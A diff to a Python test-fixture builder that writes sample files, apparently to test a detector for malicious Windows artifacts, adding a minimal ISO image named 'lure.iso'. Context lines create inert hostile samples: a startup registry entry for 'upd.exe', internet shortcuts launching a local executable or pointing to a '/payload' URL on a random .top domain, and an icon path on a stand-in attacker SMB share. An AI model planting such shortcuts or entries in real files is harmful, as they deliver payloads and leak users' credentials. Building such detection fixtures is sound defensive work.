@@ -249,6 +249,10 @@ def build_folder(root):
                 b"\"upd\"=\"C:\\\\g\\\\upd.exe\"\r\n")
     w("evil.url", b"[InternetShortcut]\r\nURL=file://C:\\\\g\\\\upd.exe\r\n")
     w("good.url", b"[InternetShortcut]\r\nURL=https://store.steampowered.com\r\n")
+    # minimal ISO9660: PVD (type 1 CD001) at sector 16 + terminator
+    _pvd = b"\x01CD001\x01" + b"\x00" * 2041
+    _end = b"\xffCD001\x01" + b"\x00" * 2041
+    w("lure.iso", b"\x00" * 0x8000 + _pvd + _end)
     w("phishy.url", b"[InternetShortcut]\r\nURL=http://update-7f3b2c1d9e4f.x8k2.top/payload\r\n")
     w("uncicon.url", b"[InternetShortcut]\r\nURL=https://store.steampowered.com\r\n"
                       b"IconIndex=1\r\nIconFile=\\\\evil-share.example\\x.ico\r\n")
